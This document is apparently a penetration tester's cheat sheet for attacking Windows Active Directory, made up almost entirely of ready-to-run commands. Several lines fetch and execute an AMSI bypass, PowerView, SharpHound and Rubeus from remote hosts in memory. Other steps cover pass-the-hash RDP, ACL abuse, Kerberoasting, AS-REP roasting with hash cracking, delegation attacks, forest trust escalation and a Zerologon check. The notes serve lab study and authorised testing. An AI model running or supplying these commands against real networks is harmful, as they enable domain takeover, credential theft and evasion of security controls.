    ********
    MIGHT NEED TO RUN UNDER DOMAIN USER CONTEXT - impersonate token, mimikatz/rubeus PTH, migrate, etc.
            //initiate domain login for enumeration:
                New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
                proxychains xfreerdp /u:user /pth:a71ad837cd4a6fcd8..... /v:172.16.167.160 /cert-ignore /size:2800x1900 /scale:180
    ********

    (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
    (new-object system.net.webclient).downloadstring('http://192.168.49.121/PowerView.ps1') | IEX
    (new-object system.net.webclient).downloadstring('http://192.168.49.121/adPEAS.ps1') | IEX

    //Initial Native Enum:
        net user
        net user /domain
        net group "Domain Computers" /domain
        net group "Domain Controllers" /domain
        net localgroup
        net group /domain
        net localgroup [groupname]
        net group [groupname] /domain

    //***View all SPNs:
        setspn -T <domain> -Q */*
        Get-NetUser -SPN

    //**Enum & BloodHound Collection with adPEAS.ps1:
        Invoke-adPEAS -scope All -Outputfile ADPEAS.txt
        //AND: Invoke-adPEAS -scope GPOLocalGroup -Outputfile ADPEAS2.txt
        //Another domain:  Invoke-adPEAS -scope All -domain 'comply.com' -Outputfile ADPEAS3.txt

    //##Manual PowerView.ps1 Enumeration:
        get-domain
        Get-ForestGlobalCatalog
        Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
        Get-DomainUser | select -ExpandProperty cn
        Get-DomainComputer
        #Domains in Current Forest:  Get-ForestDomain
        Get-DomainGroup
        Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
        Get-DomainGroup *admin* -Properties samaccountname
        Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember
        Get-NetGroupMember "Domain Admins" -recurse
        Get-NetGroup -GroupName "Domain Admins" -FullData
        Get-NetGroupMember "Enterprise Admins" -recurse
        Get-DomainTrust
        Get-ForestTrust
        Get-NetGPOGroup -Verbose
        Get-NetOU
        Get-NetGPO
        Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess
        Get-DomainOU -FullData
            #Computers in an OU:  Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname
        Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
        Get-NetLoggedon -ComputerName <computer-name>          //need admin
        Get-LastLoggedOn -ComputerName <computer-name>       //need admin and registry 

        //Foreign group memberships:  
            Get-DomainForeignGroupMember 
            Get-DomainForeignGroupMember -domain <otherDomain>
            get-domainforeignuser


    //##User Hunting:
        #Finds all machines on the current domain where the current user has local admin access
            Find-LocalAdminAccess -Verbose
        #Find local admins on all machines of the domain
            Find-DomainLocalGroupMember -Verbose
        #Find computers where a Domain Admin OR a specified user has a session
            Find-DomainUserLocation | Select-Object UserName, SessionFromName
        # Hunt for sessions of interesting users on machines where you have access:  
            Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }
        #Confirming admin access
            Test-AdminAccess

    //File Share Scanning:
        \\192.168.49.121\visualstudio\snaffler.exe -s -o snaffler.log
        \\192.168.49.121\visualstudio\snaffler.exe -d domain.local -c <DCIP> -s -o snaffler_domain.log

    //Object Permissions:
        //***View Specific Object ACLs:  get-domainobjectacl -identity <CN> -domain abc.com -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName TargetGroup -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | select AceType,IsInherited,TargetGroup,ActiveDirectoryRights
        ***//Look for: GenericAll, GenericWrite, ForceChangePassword, AllExtendedRights, WriteDACL, etc.
        **Automated exploitation from kali:  aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161
        
        //Checking specific user:  Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
        //Users we have rights over:  Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
        //Groups we have rights over:  Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
        //Computers we have rights over:  Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
        //Tools:
            //Checking individual objects - aced.py:
                python3 aced.py prod.corp1.com/Offsec:lab@192.168.189.70
            //Bloodhound (if not using adPEAS.ps1):
                    (new-object system.net.webclient).downloadstring('http://192.168.45.158/amsi.txt') | IEX
                    (new-object system.net.webclient).downloadstring('http://192.168.45.210/SharpHound.ps1') | IEX
                    Invoke-Bloodhound -s
                    Invoke-BloodHound -CollectionMethod LoggedOn
        //Abusable Permissions:
            GenericAll - full rights to the object (add users to a group or reset user's password); abused with Set-DomainUserPassword or Add-DomainGroupMember
            GenericWrite - update object's attributes (i.e logon script); abused with Set-DomainObject
            WriteOwner - change object owner to attacker controlled user take over the object; abused with Set-DomainObjectOwner
            WriteDACL - modify object's ACEs and give attacker full control right over the object; abused with Add-DomainObjectACL
            AllExtendedRights - ability to add user to a group or reset password; abused with Set-DomainUserPassword or Add-DomainGroupMember
            ForceChangePassword - ability to change user's password; abused with Set-DomainUserPassword
            Self (Self-Membership) - ability to add yourself to a group
            AddMembers abused with Add-DomainGroupMember

    //Kerberos Delegation:
        //*check Bloodhound*
        //Unconstrained:
            Get-DomainComputer -Unconstrained
            Get-DomainUser -Unconstrained
            Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
            Get-DomainUser -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            nslookup <server> - then access via lateral movement or exploit
                //from there, exploit DC w/ SpoolSample or krbrelay
        //Constrained:
            Get-DomainUser -TrustedToAuth
            Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto,useraccountcontrol
            Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
            //especially note if current computer has anything
            //Exploit w/ Rubeus to get ticket to next allowed target
        //Resource Based Constrained:
            //finding computers we have rights over:
                Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
                //If GenericWrite/GenericAll/WriteProperty/WriteDACL - perform RBCD attack w/ Rubeus to get privileged access!

    //Kerberoasting:
        //Checking for users w/ SPNs:
            //Check BloodHound
            GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 -request -outputfile tgsrep.in
            //Native:   setspn -T <domain> -Q */*
        //Making a user Kerberoastable (if you have privs):
            Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
        //Getting hashes:
            (new-object system.net.webclient).downloadstring('http://192.168.45.158/amsi.txt') | IEX
            //PowerView:
                iex (new-object Net.WebClient).DownloadString("http://192.168.45.158/Invoke-Kerberoast.ps1")
                Invoke-Kerberoast -OutputFormat Hashcat | fl
                Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
                //Or:  Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"
            //Rubeus:
                //in-memory:  $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.210/Rubeus.exe'); $assem = [System.Reflection.Assembly]::Load($data); [Rubeus.Program]::Main("<args>".Split())
                .\Rubeus.exe kerberoast /format:hashcat /nowrap [/usetgtdeleg] [/user:svc_mssql] [/domain:corp2.com]
                .\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast      #Specific user
                .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap      #Get of admins
        //Cracking:
            hashcat -m 13100 --force -a 0 /tmp/hash /usr/share/wordlists/rockyou.txt
            john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast

    //AS-REP Roasting:
        //Check for users:
            //PowerView:
                Get-DomainUser -PreauthNotRequired -verbose
            //Or:  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
            //Kali:  kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
            //Check and Exploit from Kali:
                GetNPUsers.py corp2.com/Administrator:lab -request -format hashcat -outputfile hashes.asreproast     //sudo echo "192.168.235.80 corp2.com" >> /etc/hosts
                //w/o creds:  GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
        //Enable (no preauth) for users you have privs/GenericAll over:
            Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
        //Exploit:
            rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local [/format:hashcat] [/outfile:out.txt]
            //Or:  Get-ASREPHash -UserName TargetUser
            //Or:  Invoke-ASREPRoast -Verbose
        //Crack:
            hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 

    //Forests Summary:
        //Enumerating Trusts:
            //Method 1:  nltest /trusted_domains
                //Primary Domain = current domain
                //Direct Outbound & Direct Inbound = bidirectional trust
            //Method 2:  ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
            //Method 3 - PowerView:  Get-DomainTrust -API
                //From that next domain (if it isn't root):  Get-DomainTrust -API -Domain <abc.com>
            //Method 4:  Get-DomainTrust
            //Further enum w/ PowerView:
                ex.  Get-DomainUser -Domain corp1.com;  Get-NetGroupMember -GroupName "Enterprise Admins"
        //Exploitation:
            //Method 1: After compromising current domain, can create Enterprise Admin golden ticket via ExtraSID feature
            //Method 2: If local admin on server with Unconstrained Delegation, use Rubeus & PrintSpoofer to exploit new DC
            //Method 3: If no server w/ UD (but have domain admin), add a UD server and use PrintSpoofer exploit
        //Enumerating Additional Forests:
            1. Find Trusts:
                //Check for Trusts:
                    ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
                //Check for trusts in child domains of the other forest from corp1.com:
                    Get-DomainTrust -Domain corp1.com
                //Automated:
                    Get-DomainTrustMapping
            2. Enumerate users/groups/etc. in the trusted forest:
                Get-DomainUser -Domain corp2.com
                //Look for users with same accounts in different forests - could share creds
                //Look for foreign group membership of local users:
                    Get-DomainForeignGroupMember -Domain corp2.com
                        convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
                    //If we compromise the local user, we could gain access to the other forest (corp2.com)
            //can also exploit via linked SQL servers


    //Check Zerologon:
        python3 zerologon_tester.py dc02 192.168.189.130